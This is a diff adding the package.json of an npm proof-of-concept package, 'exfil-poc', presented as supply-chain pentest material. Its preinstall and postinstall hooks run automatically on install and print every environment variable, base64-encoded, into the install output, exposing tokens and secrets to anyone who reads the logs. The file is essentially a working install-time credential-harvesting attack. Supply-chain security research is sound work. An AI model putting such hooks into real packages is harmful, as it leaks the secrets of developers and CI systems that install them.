@@ -1,0 +1,26 @@
+{
+  "name": "exfil-poc",
+  "version": "1.0.0",
+  "description": "PoC package in npm for data exfil",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "echo \"Environment variables exfil before install: $(env | base64)\"",
+    "postinstall": " echo \"Environment variables exfil after install: $(env | base64)\""
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/pwn-org/exfil-poc.git"
+  },
+  "keywords": [
+    "poc",
+    "supply-chain",
+    "pentest"
+  ],
+  "author": "AA",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/pwn-org/exfil-poc/issues"
+  },
+  "homepage": "https://github.com/pwn-org/exfil-poc#readme"
+}
